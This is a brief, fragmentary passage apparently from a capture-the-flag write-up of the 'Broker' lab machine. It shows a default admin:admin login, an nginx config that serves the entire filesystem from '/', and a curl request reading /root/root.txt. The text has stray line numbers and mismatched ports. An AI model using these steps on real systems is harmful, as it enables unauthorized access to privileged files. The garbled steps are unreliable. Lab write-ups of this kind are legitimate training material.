Visiting broker.htb prompts authentication, which out of instinct I inputted admin:admin and it succeeded :p

User Flag

I then see I’m the user activemq and read the user flag.

1
2

    worker_connections 1024;
}
http {
    server {
        listen 9999;
        root /;
    }
}

and then just read the root flag!

2

$ curl -L "http://localhost:1337/root/root.txt"
